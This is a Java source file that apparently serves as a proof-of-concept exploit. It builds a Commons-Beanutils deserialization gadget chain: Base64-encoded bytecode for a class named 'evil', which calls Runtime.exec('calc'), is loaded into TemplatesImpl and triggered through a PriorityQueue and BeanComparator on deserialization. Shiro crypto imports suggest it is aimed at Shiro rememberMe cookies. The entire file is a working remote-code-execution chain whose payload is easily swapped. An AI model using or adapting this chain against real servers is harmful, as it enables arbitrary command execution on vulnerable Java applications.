import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.io.*;
import java.util.*;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class cb {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMABkAGgcAJwwAKAApAQAEY2FsYwwAKgArAQAEZXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAACgALAAAAIAADAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABAAEQACABIAAAAEAAEAEwABAAcAFAACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAADgALAAAAKgAEAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABUAFgACAAAAAQAXABgAAwASAAAABAABABMAAQAZABoAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAQAAQAEQANABIACwAAAAwAAQAAAA4ADAANAAAAEgAAAAQAAQAbAAEAHAAAAAIAHQ==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "zeropeach");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator(null);
        Queue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        // ⽣成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(barr.toByteArray());

        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
